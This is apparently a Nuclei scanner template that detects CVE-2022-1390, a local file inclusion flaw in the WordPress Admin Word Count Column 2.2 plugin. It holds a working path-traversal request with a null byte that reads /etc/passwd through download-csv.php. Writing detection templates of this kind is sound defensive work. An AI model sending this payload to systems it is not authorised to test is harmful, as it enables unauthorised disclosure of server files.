id: CVE-2022-1390
info:
  name: WordPress Admin Word Count Column 2.2 - Local File Inclusion
  author: daffainfo,Splint3r7
  severity: critical
  description: The WordPress Admin Word Count Column 2.2 plugin is vulnerable to local
    file inclusion due to lack of path parameter validation, allowing attackers to
    read arbitrary files on the server and potentially execute remote code through
    Phar deserialization.
  reference:
  - https://packetstormsecurity.com/files/166476/WordPress-Admin-Word-Count-Column-2.2-Local-File-Inclusion.html
  - https://wordpress.org/plugins/admin-word-count-column/
  - https://wpscan.com/vulnerability/6293b319-dc4f-4412-9d56-55744246c990
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1390
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1390
    cwe-id: CWE-22
  tags: packetstorm,wpscan,cve,cve2022,wordpress,wp-plugin,lfi,wp
  metadata:
    impact: The impact of CVE-2022-1390 on servers running an old PHP version that
      are susceptible to null byte technique could allow unauthenticated attackers
      to read arbitrary files and potentially execute RCE via a Phar Deserialization
      technique.
    recommendation: It is recommended that users immediately update to the latest
      version of the WordPress Admin Word Count Column plugin to prevent potential
      attacks leveraging the CVE-2022-1390 vulnerability.
requests:
- method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\0'
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
